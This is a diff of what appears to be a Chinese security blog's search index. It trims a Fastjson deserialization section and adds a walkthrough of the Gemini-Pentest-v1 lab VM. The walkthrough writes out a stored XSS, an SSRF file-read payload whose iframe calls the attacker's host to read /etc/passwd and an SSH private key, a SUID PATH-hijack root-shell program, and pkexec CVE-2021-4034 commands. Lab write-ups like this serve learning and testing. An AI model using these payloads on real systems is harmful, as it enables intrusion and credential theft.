@@ -518,8 +518,8 @@
 <li>fastjson 在反序列化时，如果Field类型为byte[]，将会调用<code>com.alibaba.fastjson.parser.JSONScanner#bytesValue</code>进行base64解码，在序列化时也会进行base64编码</li>
 </ol>
 <h1 id="0x03-fastjson-lt-x3D-1-2-24"><a href="#0x03-fastjson-lt-x3D-1-2-24" class="headerlink" title="0x03 fastjson&lt;&#x3D;1.2.24"></a>0x03 fastjson&lt;&#x3D;1.2.24</h1><p>此时fastjson第一次出现 </p>
-<p>此时可以利用的两个类</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">com.sun.rowset.JdbcRowSetImpl</span><br><span class="line">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><br></pre></td></tr></table></figure>
+<p>此时可以利用的一个类</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">com.sun.rowset.JdbcRowSetImpl</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <h2 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h2><p>JdbcRowSetImpl 内置javabean 并且可以进行一个主机端访问 外网的操作</p>
 <p>当受害机 对json字符串进行JSON.parse()时</p>
@@ -540,18 +540,8 @@
 
 
 
-<h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><p>由于<code>TemplatesImpl</code>这个属性有getter方法，且满足之前说的特性，所以当设置完所有属性的值后，会调用它的getter方法，也就是getOutputProperties</p>
-<img src="/2023/09/09/Fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230909202524580.png" class="" title="image-20230909202524580">
 
-<img src="/2023/09/09/Fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230909202554491.png" class="" title="image-20230909202554491">
 
-<img src="/2023/09/09/Fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230909202611609.png" class="" title="image-20230909202611609">
-
-<img src="/2023/09/09/Fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230909204833204.png" class="" title="image-20230909204833204">
-
-<img src="/2023/09/09/Fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230909204804738.png" class="" title="image-20230909204804738">
-
-<p>动态类加载 使字节码变成java类</p>
 <h1 id="0x04-Fastjson-lt-1-2-48"><a href="#0x04-Fastjson-lt-1-2-48" class="headerlink" title="0x04 Fastjson&lt;1.2.48"></a>0x04 Fastjson&lt;1.2.48</h1><p>fastjson于1.2.24版本后增加了反序列化白名单，并且fastjson&gt;&#x3D;1.2.25 autoTypeSupport默认为false，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。</p>
 <p>当没有开启autoType时</p>
 <img src="/2023/09/09/Fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230910133640225.png" class="" title="image-20230910133640225">
@@ -1912,6 +1902,166 @@
       <tags>
         <tag>mysql</tag>
         <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Gemini-Pentest-v1</title>
+    <url>/2023/10/31/Gemini-Pentest-v1/</url>
+    <content><![CDATA[<p>环境 </p>
+<p>攻击机 kali IP 192.168.6.142</p>
+<p>靶机  Gemini-Pentest-v1 IP 192.168.6.152 </p>
+<h1 id="0x00-信息收集"><a href="#0x00-信息收集" class="headerlink" title="0x00 信息收集"></a>0x00 信息收集</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -v 192.168.6.0/24</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<img src="/2023/10/31/Gemini-Pentest-v1/image-20231030170530005.png" class="" title="image-20231030170530005">
+
+<p>通过更详细的扫描</p>
+<img src="/2023/10/31/Gemini-Pentest-v1/image-20231030171754217.png" class="" title="image-20231030171754217">
+
+
+
+<p>主机开启了80与22端口 ssh-hostkey只是远程服务器的公共密钥的指纹摘要，用于安全连接。公钥指纹是一种安全机制，用于验证远程服务器的身份，确保你连接到的是你期望连接的服务器而不是恶意的中间人攻击。这里无法利用</p>
+<h1 id="0x01-web渗透"><a href="#0x01-web渗透" class="headerlink" title="0x01 web渗透"></a>0x01 web渗透</h1><p>访问80端口</p>
+<p>打开发现有一个登录的界面</p>
+<img src="/2023/10/31/Gemini-Pentest-v1/image-20231030172740955.png" class="" title="image-20231030172740955">
+
+
+
+<p>扫描目录</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.6.152 -e* -i 200                                               </span><br></pre></td></tr></table></figure>
+
+<img src="/2023/10/31/Gemini-Pentest-v1/image-20231030172428392.png" class="" title="image-20231030172428392">
+
+<p>没什么用</p>
+<img src="/2023/10/31/Gemini-Pentest-v1/image-20231030174259265.png" class="" title="image-20231030174259265">
+
+
+
+<p>开源项目 github搜索下</p>
+<img src="/2023/10/31/Gemini-Pentest-v1/image-20231030174906195.png" class="" title="image-20231030174906195">
+
+<p>在线网站<a href="https://www.cmd5.com/default.aspx">md5在线解密破解,md5解密加密 (cmd5.com)</a></p>
+<img src="/2023/10/31/Gemini-Pentest-v1/image-20231030174915253.png" class="" title="image-20231030174915253">
+
+
+
+<p>在未改密码的情况下</p>
+<p>账号 admin 密码 1234</p>
+<h1 id="0x02-存储型XSS"><a href="#0x02-存储型XSS" class="headerlink" title="0x02 存储型XSS"></a>0x02 存储型XSS</h1><blockquote>
+<p>XSS（Cross Site Scripting）跨站脚本攻击，是指攻击者利用Web服务器中的应用程序或代码漏洞，在页面中嵌入客户端脚本（通常是一段由JavaScript编写的恶意代码），当信任此Web服务器的用户访问Web站点中含有恶意脚本代码的页面或打开收到的URL链接时，用户浏览器会自动加载并执行恶意代码，达到攻击的目的</p>
+</blockquote>
+<p>这个项目的display_name存到数据库再从数据库中提取出来 所以可以构成存储型的XSS</p>
+<img src="/2023/10/31/Gemini-Pentest-v1/image-20231030203302583.png" class="" title="image-20231030203302583">
+
+<img src="/2023/10/31/Gemini-Pentest-v1/image-20231030201959240.png" class="" title="image-20231030201959240">
+
+
+
+
+
+
+
+<h1 id="0x03-wkhtmltopdf-文件包含漏洞到SSRF本地文件读取"><a href="#0x03-wkhtmltopdf-文件包含漏洞到SSRF本地文件读取" class="headerlink" title="0x03 wkhtmltopdf 文件包含漏洞到SSRF本地文件读取"></a>0x03 wkhtmltopdf 文件包含漏洞到SSRF本地文件读取</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php header(&#x27;location:file://&#x27;.$_REQUEST[&#x27;url&#x27;]); ?&gt;       </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;iframe height=&quot;2000&quot; width=&quot;800&quot;  src=&quot;http://192.168.6.142:2333/read.php?url=/etc/passwd&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php -S 192.168.6.142:2333</span><br></pre></td></tr></table></figure>
+
+
+
+<img src="/2023/10/31/Gemini-Pentest-v1/image-20231030213308593.png" class="" title="image-20231030213308593">
+
+
+
+<h1 id="0x04-SSH公钥认证"><a href="#0x04-SSH公钥认证" class="headerlink" title="0x04 SSH公钥认证"></a>0x04 SSH公钥认证</h1><p>ssh登录时会先检查公钥，公钥位置在~&#x2F;.ssh&#x2F;authorized_keys</p>
+<p>如果想要 利用公私钥登录而无需输入密码，需要更改如下配置</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line">AuthorizedKeysFile .ssh/authorized_keys</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>攻击机生成 存放在~&#x2F;.ssh</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa <span class="comment">#三次回车</span></span><br><span class="line">id_rsa : 私钥</span><br><span class="line">id_rsa.pub : 公钥</span><br></pre></td></tr></table></figure>
+
+<p>上传公钥至目标主机即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">路径  /root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
+
+
+
+<p>言归正转，这里利用私钥登录</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -i id_rsa user@192.168.6.152</span><br></pre></td></tr></table></figure>
+
+<p>通过读取&#x2F;etc&#x2F;passwd </p>
+<p>最后的:&#x2F;bin&#x2F;bash表示可以远程登录</p>
+<p>&#x2F;root&#x2F;.ssh&#x2F;authorized_keys 恰好是靶机生成的 id_rsa.pub</p>
+<p>读取私钥文件</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">height</span>=<span class="string">&quot;2000&quot;</span> <span class="attr">width</span>=<span class="string">&quot;800&quot;</span>  <span class="attr">src</span>=<span class="string">&quot;http://192.168.6.142:2333/read.php?url=/home/gemini1/.ssh/id_rsa&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2023/10/31/Gemini-Pentest-v1/image-20231030215511357.png" class="" title="image-20231030215511357">
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 400 id_rsa</span><br><span class="line">ssh -i id_rsa gemini1@192.168.6.152</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/10/31/Gemini-Pentest-v1/image-20231030215920231.png" class="" title="image-20231030215920231">
+
+
+
+<h1 id="0x05-提权"><a href="#0x05-提权" class="headerlink" title="0x05 提权"></a>0x05 提权</h1><img src="/2023/10/31/Gemini-Pentest-v1/image-20231030223053356.png" class="" title="image-20231030223053356">
+
+<img src="/2023/10/31/Gemini-Pentest-v1/image-20231030223127895.png" class="" title="image-20231030223127895">
+
+<img src="/2023/10/31/Gemini-Pentest-v1/image-20231030223217342.png" class="" title="image-20231030223217342">
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit 4.9.0-4-amd64</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/10/31/Gemini-Pentest-v1/image-20231030223343269.png" class="" title="image-20231030223343269">
+
+
+
+
+
+<h2 id="suid提权-环境变量劫持"><a href="#suid提权-环境变量劫持" class="headerlink" title="suid提权 环境变量劫持"></a>suid提权 环境变量劫持</h2><p>查找具有SUID权限的程序：</p>
+<img src="/2023/10/31/Gemini-Pentest-v1/image-20231030222905528.png" class="" title="image-20231030222905528">
+
+
+
+<img src="/2023/10/31/Gemini-Pentest-v1/image-20231030224302695.png" class="" title="image-20231030224302695">
+
+<p>执行listinfo</p>
+<img src="/2023/10/31/Gemini-Pentest-v1/image-20231030224409743.png" class="" title="image-20231030224409743">
+
+
+
+<p>主要执行了上面的四条命令</p>
+<h2 id="环境变量劫持"><a href="#环境变量劫持" class="headerlink" title="环境变量劫持"></a>环境变量劫持</h2><p>攻击者取得一个shell 但是没有root权限 找到root用户创建的具有u+s 权限的文件假如这个文件名是sky 运行这个文件执行了一个系统指令如 ls</p>
+<p>这个时候攻击者创造一个在&#x2F;tmp目录下文件名字是ls 的可执行文件 通过修改环境变量 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export PATH=/tmp:$PATH </span><br><span class="line">./sky</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	setuid(<span class="number">0</span>);</span><br><span class="line">	setgid(<span class="number">0</span>);</span><br><span class="line">	system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc date.c -o date	               # 编译date.c</span><br><span class="line">export PATH=/tmp:$PATH               # 添加环境变量</span><br><span class="line">listinfo</span><br></pre></td></tr></table></figure>
+
+
+
+<img src="/2023/10/31/Gemini-Pentest-v1/image-20231030230440809.png" class="" title="image-20231030230440809">
+
+<h1 id="pkexec提权"><a href="#pkexec提权" class="headerlink" title="pkexec提权"></a>pkexec提权</h1><p><a href="https://github.com/berdav/CVE-2021-4034">https://github.com/berdav/CVE-2021-4034</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd CVE-2021-4034/</span><br><span class="line">make</span><br><span class="line">./cve-2021-4034</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/10/31/Gemini-Pentest-v1/image-20231030231414799.png" class="" title="image-20231030231414799">
+
+
+
+
+
+]]></content>
+      <tags>
+        <tag>-靶机渗透</tag>
       </tags>
   </entry>
 </search>
